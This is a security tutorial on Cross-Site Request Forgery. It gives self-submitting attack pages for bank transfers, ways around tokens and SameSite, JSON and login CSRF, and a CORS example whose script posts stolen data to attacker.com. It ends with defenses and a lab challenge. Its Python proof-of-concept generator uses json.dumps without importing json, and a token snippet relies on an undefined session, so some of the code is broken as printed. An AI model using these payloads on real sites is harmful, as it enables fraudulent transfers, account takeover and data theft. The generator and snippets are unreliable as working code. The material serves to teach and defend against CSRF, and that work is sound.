CSRF

Cross-Site Request Forgery - forcing authenticated users to perform unwanted actions through automatic cookie inclusion.

Overview

Cross-Site Request Forgery tricks an authenticated browser into sending a state-changing request to a site where the victim holds a session cookie. This article explains why cookies travel with cross-site requests, how to build GET and POST attack pages, how CSRF tokens fail in practice, and how SameSite cookies and token validation stop the attack.

Required Reading

  • HTTP - methods, cookies, Same-Origin Policy, request construction
  • Authentication - session management, cookie attributes, token-based authentication

How CSRF Works

When a user logs into bank.com , the server sets a session cookie. For every subsequent request to bank.com , the browser automatically attaches that cookie - regardless of which website originated the request. 

Victim visits attacker.com
  → attacker.com sends a form/request to bank.com/transfer
    → Browser attaches victim's bank.com cookies
      → bank.com processes the transfer as if the victim initiated it

The browser's Same-Origin Policy controls which origin a script can read data from (cross-origin reads), but it does NOT prevent cross-origin writes. A form from attacker.com can POST to bank.com - and the browser will include bank.com 's cookies.

This is not a browser bug. It's how the web was designed: cookies are "ambient authority" - they travel with every request to their origin regardless of the initiating context.

Session Cookie Mechanics

Cookies have attributes that control their behavior:

Attribute Effect on CSRF
Domain=.bank.com Cookie sent to bank.com and all subdomains
Path=/ Cookie sent to all paths
Secure Cookie only sent over HTTPS
HttpOnly Cookie inaccessible todocument.cookie(does NOT prevent CSRF)
SameSite=Strict Cookie NOT sent on cross-site requests. Blocks CSRF.
SameSite=Lax Cookie sent on top-level GET navigations. Partial CSRF protection.
SameSite=None Cookie sent on all cross-site requests. No CSRF protection.

HttpOnly Does Not Block CSRF

HttpOnly prevents JavaScript from reading the cookie but does NOT prevent the browser from attaching it to requests. CSRF exploits the automatic attachment, not cookie reading.

CSRF Attack Construction

Classic Form-Based CSRF (GET)

<!-- attacker.com/csrf-attack.html -->
<html>
<body>
    <h1>Loading your free gift...</h1>
    <!-- Victim's browser sends GET request with bank.com cookies -->
    <img src="https://bank.com/transfer?to=attacker_account&amount=10000" style="display:none">
</body>
</html>

When the victim visits this page, their browser makes a GET request to bank.com/transfer with the victim's bank.com cookies. If the bank processes transfers via GET parameters, the transfer executes.

Classic Form-Based CSRF (POST)

<!-- attacker.com/csrf-post.html -->
<html>
<body>
    <h1>Claim Your Prize!</h1>
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>
        // Auto-submit the form
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>

AJAX CSRF with fetch()

<html>
<body>
<script>
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',      // Include cookies in cross-origin request
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'to=attacker_account&amount=10000'
});
</script>
</body>
</html>

CORS Preflight

For cross-origin requests with Content-Type: application/json or custom headers, the browser sends a preflight OPTIONS request. If the target server does not return appropriate CORS headers ( Access-Control-Allow-Origin , Access-Control-Allow-Credentials ), the actual request is blocked.

Preflight Bypass

Use Content-Type: application/x-www-form-urlencoded or text/plain - these are "simple requests" that do NOT trigger a preflight. Or use mode: 'no-cors' , which sends the request but makes the response opaque (unreadable by JavaScript, but the action still executes server-side).

CSRF Token Bypass Techniques

Token Not Validated

The server generates a CSRF token but never checks it on the backend. 

<form action="/transfer" method="POST">
    <input type="hidden" name="csrf" value="any_value_works">
    ...
</form>

Testing Token Validation

Remove the CSRF token from the request entirely. If it still works, the token isn't validated.

Token Predictable

The CSRF token follows a known pattern. 

# Observe token patterns
Token: 1719453600_admin      # Unix timestamp + username
Token: md5(session_id)        # Hash of session
Token: base64(session_id)     # Base64 of session

Exploiting Predictable Tokens

Generate the token yourself:

import hashlib
import time
import requests

# If token = md5(session_id)
session_id = requests.utils.dict_from_cookiejar(session.cookies).get('sessionid')
csrf_token = hashlib.md5(session_id.encode()).hexdigest()

# If token = timestamp
csrf_token = str(int(time.time()))

Token Leaked via HTTP Referer

The CSRF token appears in the Referer header when navigating from one page to another within the application. If the attacker can get the Referer, they get the token. 

<!-- On attacker-controlled page, use a link to leak the referer -->
<a href="https://attacker.com/ref-steal" referrerpolicy="unsafe-url">
    Click for free stuff
</a>

Token Tied to Session, Not Action

A single CSRF token is used for the entire session. The attacker obtains it once and reuses it. 

// If account settings page has the token visible:
fetch('https://bank.com/settings')
  .then(r => r.text())
  .then(html => {
      let token = html.match(/name="csrf" value="([^"]+)"/)[1];
      // Now use this token for the transfer
      fetch('https://bank.com/transfer', {
          method: 'POST',
          body: `to=attacker&amount=10000&csrf=${token}`,
          credentials: 'include'
      });
  });

But this requires XSS or CORS misconfiguration. Which brings us to:

Token Stolen via XSS + CSRF Combined

XSS on bank.com can read the CSRF token from the DOM : 

var token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/transfer', {
    method: 'POST',
    headers: { 'X-CSRF-Token': token },
    body: 'to=attacker&amount=10000',
    credentials: 'include'
});

XSS bypasses all CSRF protections. This is why XSS and CSRF are often chained.

Validation Skipped on GET

Some applications skip CSRF validation for GET requests: 

# POST requires token (blocked)
curl -X POST 'https://bank.com/transfer' -d 'to=attacker&amount=10000'
# "CSRF token missing"

# GET does not require token (vulnerable)
curl 'https://bank.com/transfer?to=attacker&amount=10000'
# "Transfer complete"

Method Override Bypass

Some frameworks accept _method overrides: 

# Application thinks this is POST, but browser sends as GET (no preflight)
curl 'https://bank.com/transfer?_method=POST&to=attacker&amount=10000'

SameSite Cookie Bypass

SameSite Value When Cookie Is Sent CSRF Protection
Strict Only same-site requests Full protection
Lax Same-site + top-level GET navigations Partial (GET CSRF possible)
None All requests No protection
Not set (Chrome default) Treated as Lax since Chrome 80 Partial

SameSite=Lax Bypass

Lax mode allows cookies on "top-level navigations with safe methods" (GET). This means:

Victim clicks <a href="https://bank.com/transfer?to=attacker&amount=10000">
  → Browser sends bank.com cookies (top-level GET navigation)
  → Transfer executes

Exploit

<!-- Works with SameSite=Lax -->
<a href="https://bank.com/transfer?to=attacker&amount=10000">
    Click here to view a funny cat video
</a>

Redirect Bypass

If the app processes an action with GET and then redirects:

<!-- attacker.com/lax-bypass.html -->
<!-- Redirect immediately (same effect as clicking a link) -->
<script>location.href = 'https://bank.com/transfer?to=attacker&amount=10000';</script>

Chaining with Open Redirect

https://bank.com/logout?redirect=https://bank.com/transfer?to=attacker&amount=10000

The victim starts on bank.com , the redirect keeps them on bank.com , SameSite=Lax sends cookies throughout.

Bypass via Sibling Subdomain

If the bank has a vulnerable subdomain (e.g., blog.bank.com with XSS ), and the session cookie has Domain=bank.com : 

// XSS on blog.bank.com — this is same-site to bank.com
// SameSite=Lax sends cookies within the same site (same registrable domain)
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    body: 'to=attacker&amount=10000'
});

JSON CSRF

API s that accept JSON but don't check Content-Type can be exploited: 

<html>
<body>
<form id="csrf" action="https://bank.com/api/transfer" method="POST"
      enctype="text/plain">
    <input type="hidden" name='{"to":"attacker","amount":10000,"csrf":"ignored"}'
           value="">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>

The browser sends:

Content-Type: text/plain

{"to":"attacker","amount":10000,"csrf":"ignored"}=

The server sees text/plain , parses the body as JSON (because the API always parses JSON ), and processes it. The trailing = is often ignored by JSON parsers.

JSON CSRF with fetch (no-cors mode)

fetch('https://bank.com/api/transfer', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

Login CSRF

The attacker forces the victim to log into the attacker's account:

<form id="login-csrf" action="https://bank.com/login" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="attacker_pass">
</form>
<script>document.getElementById('login-csrf').submit();</script>

Login CSRF Impact

The victim is now logged into the attacker's account. If the victim performs actions (posts, messages, search queries), those actions are attributed to the attacker. The attacker can later view the victim's activity history.

On sites where the same browser is used for sensitive actions (search history, watched videos, liked posts), login CSRF enables the attacker to extract the victim's private data from the attacker's own activity log.

CORS Misconfigurations

CORS (Cross-Origin Resource Sharing) is the browser mechanism that allows controlled cross-origin access. Misconfiguration turns CSRF into full cross-origin data theft.

Access-Control-Allow-Origin Reflection

# Server response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

The server echoes back any Origin header. An attacker can make authenticated cross-origin requests and read the response: 

// attacker.com
fetch('https://bank.com/user-data', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    // Read victim's private data
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});

Access-Control-Allow-Origin: null

Browser sends Origin: null for requests from sandboxed iframes, file:// URI s, and data URI s. If the server allows null , an attacker can use a sandboxed iframe: 

<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
fetch('https://bank.com/data', {credentials:'include'})
  .then(r=>r.text()).then(d=>alert(d))
</script>">
</iframe>

Wildcard Origin with Credentials

* with Access-Control-Allow-Credentials: true is invalid per spec, but some servers return it. Browser behavior varies.

Complete CSRF PoC Builder

A template for building CSRF Proof-of-Concept HTML files: 

#!/usr/bin/env python3
"""CSRF PoC Generator — creates self-submitting HTML forms for CSRF attacks."""

import argparse
import base64
import urllib.parse

def build_csrf_poc(url, method, params, auto_submit=True):
    """Build a complete CSRF PoC HTML page."""
    methods_available = {
        'get': 'GET',
        'post': 'POST',
        'post_json': 'POST (JSON)',
        'multipart': 'POST (multipart)'
    }

    form_fields = ''
    json_body = {}
    for key, value in params.items():
        if method in ('post', 'multipart'):
            form_fields += f'    <input type="hidden" name="{key}" value="{value}">\n'
        json_body[key] = value

    auto_submit_js = '<script>document.getElementById("csrf-form").submit();</script>' if auto_submit else ''

    if method == 'post_json':
        form_block = f'''
    <script>
    fetch("{url}", {{
        method: "POST",
        credentials: "include",
        headers: {{ "Content-Type": "application/json" }},
        body: {json.dumps(json_body)}
    }});
    </script>'''
    elif method == 'multipart':
        form_block = f'''
    <form id="csrf-form" action="{url}" method="POST" enctype="text/plain">
{form_fields}    </form>
    {auto_submit_js}'''
    else:
        form_block = f'''
    <form id="csrf-form" action="{url}" method="{method.upper()}">
{form_fields}    </form>
    {auto_submit_js}'''

    return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
    <style>
        body {{ font-family: monospace; max-width: 700px; margin: 40px auto;
               padding: 20px; background: #111; color: #0f0; }}
        pre {{ background: #222; padding: 15px; overflow-x: auto; }}
        .poc {{ background: #1a1a1a; padding: 15px; border: 1px solid #0a0; margin: 10px 0; }}
    </style>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Target: <code>{url}</code></p>
    <p>Method: <code>{method.upper()}</code></p>
    <p>Parameters:</p>
    <pre>{json.dumps(params, indent=2)}</pre>

    <div class="poc">
        <h2>Live Attack (auto-submits)</h2>
{form_block}
        <p id="status">Attack submitted. Check if action was performed.</p>
    </div>

    <hr>
    <h2>Request that was sent</h2>
    <pre>{method.upper()} {url}
{chr(10).join(f'{k}={v}' for k, v in params.items())}</pre>

    <p><small>This page exploits CSRF in {urllib.parse.urlparse(url).netloc}.
    For authorized security testing only.</small></p>
</body>
</html>'''

def main():
    parser = argparse.ArgumentParser(description='CSRF PoC Generator')
    parser.add_argument('url', help='Target URL (e.g., https://bank.com/transfer)')
    parser.add_argument('params', nargs='+', help='Parameters as key=value pairs')
    parser.add_argument('-m', '--method', default='post',
                        choices=['get', 'post', 'post_json', 'multipart'],
                        help='HTTP method')
    parser.add_argument('-o', '--output', help='Output HTML file')
    parser.add_argument('--no-auto', action='store_true',
                        help='Do not auto-submit the form')
    args = parser.parse_args()

    params = {}
    for p in args.params:
        if '=' in p:
            k, v = p.split('=', 1)
            params[k] = v

    poc_html = build_csrf_poc(args.url, args.method, params,
                               auto_submit=not args.no_auto)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(poc_html)
        print(f"PoC written to {args.output}")
    else:
        print(poc_html)

if __name__ == '__main__':
    main()

Usage:

# Generate CSRF PoC for bank transfer
python3 csrf_poc.py 'https://bank.com/transfer' to=attacker amount=10000 \
  -m post -o bank_transfer_poc.html

# GET CSRF (SameSite=Lax bypass)
python3 csrf_poc.py 'https://bank.com/change-email' email=attacker@evil.com \
  -m get -o email_csrf.html

# JSON CSRF with text/plain
python3 csrf_poc.py 'https://bank.com/api/transfer' to=attacker amount=10000 \
  -m multipart -o json_csrf.html

Defenses

Synchronizer Token Pattern

The server embeds a unique, unpredictable token in each form. The token is checked on submission. An attacker cannot guess it and cannot read it cross-origin. 

<!-- Server generates this form -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
    ...
</form>
						
# Flask implementation
@app.before_request
def csrf_protect():
    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
        token = session.get('csrf_token')
        if not token or token != request.form.get('csrf_token'):
            abort(403)

@app.route('/form')
def form():
    session['csrf_token'] = secrets.token_hex(32)
    return render_template('form.html', csrf_token=session['csrf_token'])

SameSite Cookies (Best Defense)

Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

SameSite=Strict completely prevents CSRF . The cookie is never sent on cross-site requests - not for forms, not for navigations, not for AJAX. This is the most effective CSRF defense available today.

Double Submit Cookie

The server sets a CSRF token in a cookie AND requires the same value in a request header/body. The attacker can't read the cookie cross-origin, so can't include the matching value. 

// Client reads the cookie value and sends it as a header
const csrf_cookie = document.cookie.match(/csrf_token=([^;]+)/)[1];
fetch('/api/action', {
    method: 'POST',
    headers: { 'X-CSRF-Token': csrf_cookie },
    credentials: 'include',
    body: JSON.stringify(data)
});

Custom Headers & Preflight Check

Requiring a custom header like X-Requested-With: XMLHttpRequest forces a CORS preflight. If the server doesn't allow cross-origin requests, the browser blocks the actual request after the failed preflight.

Origin / Referer Validation

Check that the Origin or Referer header matches the application's domain: 

from urllib.parse import urlparse

ALLOWED_ORIGINS = {'https://bank.com', 'https://www.bank.com'}

def verify_origin(request):
    origin = request.headers.get('Origin')
    if origin and urlparse(origin).netloc not in {
        urlparse(o).netloc for o in ALLOWED_ORIGINS}:
        return False
    referer = request.headers.get('Referer')
    if referer and urlparse(referer).netloc not in {
        urlparse(o).netloc for o in ALLOWED_ORIGINS}:
        return False
    return True

Origin Validation Weakness

Some browsers suppress the Referer header (via Referrer-Policy: no-referrer ). The Origin header is more reliable but is still nullable for file:// and data: documents.

Challenge

The container runs a banking application vulnerable to CSRF with several endpoints at different protection levels. Build a proof-of-concept page that transfers money, then change the victim's email through the endpoint that skips token validation on GET.

csrf.Containerfile

podman build -t csrf-lab -f csrf.Containerfile .
podman run -d -p 5000:5000 csrf-lab

The banking app listens on http://localhost:5000 and exposes:

  • GET|POST /login - login that sets a session cookie with SameSite=Lax
  • GET|POST /transfer - money transfer with no CSRF token
  • POST /change-password - password change with a predictable CSRF token
  • GET /change-email - email change with no CSRF check on GET
  • POST /api/update-email - JSON CSRF test endpoint
  • POST /secure/transfer - transfer with proper CSRF protection, for comparison
